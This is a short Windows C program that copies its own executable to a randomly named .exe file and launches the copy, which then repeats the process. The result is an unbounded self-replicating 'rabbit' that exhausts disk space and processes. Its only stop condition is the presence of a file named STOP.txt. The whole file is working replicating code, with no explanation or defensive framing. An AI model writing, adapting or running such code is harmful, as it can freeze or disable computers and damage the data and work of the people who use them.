#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <process.h>
#include <string.h>
#include <windows.h>

char s[19];

void gen_random(char *s, const int len) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    int i;
    for (i = 0; i < len; ++i) {
        s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    s[len] = 0;
}

int main(int argc, char *argv[])
{
    if(argc > 1){
        srand(*argv[1]);
    }
    else{
        srand(time(NULL));
    }
    FILE *fp;
    FILE *thecopy;

    if(fopen("STOP.txt", "r")){
        printf("I will stop");
        getch();
        return 0;
    }


    fp = fopen(argv[0], "rb");
    if(fp == NULL)
    {
        printf("failed to open myself");
        getch();
        return 1;
    }
    Sleep(10);
    gen_random(s, 15);

    thecopy = fopen(strcat(s, ".exe"), "w+b");

    while(!feof(fp))
    {
        char ch = getc(fp);

            putc(ch, thecopy);
    }


    fclose(thecopy);
    spawnl(P_NOWAIT, s, s, s, NULL);
    fclose(fp);
    return 0;
}
